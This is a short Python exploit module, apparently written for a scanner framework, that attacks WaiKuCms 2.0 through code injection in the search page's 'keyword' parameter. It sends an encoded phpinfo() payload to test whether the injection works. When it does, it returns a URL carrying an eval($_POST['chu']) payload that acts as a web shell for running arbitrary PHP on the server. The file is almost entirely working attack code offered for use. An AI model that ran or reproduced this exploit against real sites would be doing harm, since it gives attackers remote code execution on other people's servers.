#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "WaiKuCms 2.0/20130612"
description = "Search.html 参数 keyword 代码执行"
reference = "http://loudong.360.cn/vul/info/id/3971"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    urls = [
        URL + "/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D",
        URL + "/search.html?keyword=%24%7B%40phpinfo%28%29%7D"
    ]

    for i, url in zip(range(1,3), urls):
        logger.process("Testing URL %d..." % i)
        r = requests.get(url, timeout=5)
        r.close()
        if "<title>phpinfo()</title>" in r.text:
            logger.success("Exploitable!")
            logger.success("Phpinfo: %s" % url)
            url = url.replace("%24%7B%40phpinfo%28%29%7D",
                              "%24%7B%40eval(%24_POST%5B'chu'%5D)%7D")
            logger.success("WebShell: %s" % url)
            return url
